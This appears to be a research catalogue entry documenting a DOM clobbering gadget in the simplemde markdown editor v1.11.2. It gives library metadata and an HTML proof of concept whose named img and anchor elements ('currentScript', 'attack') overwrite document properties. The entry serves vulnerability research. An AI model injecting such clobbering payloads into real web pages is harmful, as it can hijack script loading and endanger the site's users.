## simplemde-markdown-editor

### Meta

+ Library: simplemde
+ Version: v1.11.2
+ Stars: 9.9K
+ Fingerprint: `typeof window.simplemde !== undefined`
+ Input: Type
+ Sanitizer: N/A
+ Capability: Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/sparksuite/simplemde-markdown-editor

### PoC

```html
<!--Library-->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/simplemde/latest/simplemde.min.css">
<script src="https://cdn.jsdelivr.net/simplemde/latest/simplemde.min.js"></script>

<textarea id="sample">Hi</textarea>
<script>
var simplemde = new SimpleMDE({ element: document.getElementById("sample") });
</script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<!--Payload-->
```